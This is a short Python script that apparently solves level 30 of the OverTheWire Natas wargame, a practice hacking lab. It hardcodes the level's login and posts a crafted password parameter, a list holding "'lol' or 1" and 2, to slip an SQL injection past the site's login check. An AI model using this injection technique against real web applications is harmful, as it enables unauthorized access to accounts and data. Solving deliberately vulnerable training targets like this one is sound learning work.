import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')

u = "http://natas30.natas.labs.overthewire.org/index.pl"

params={"username": "natas30", "password": ["'lol' or 1", 2]}
response = requests.post(u, data=params, auth=basicAuth, verify=False)

print(response.text)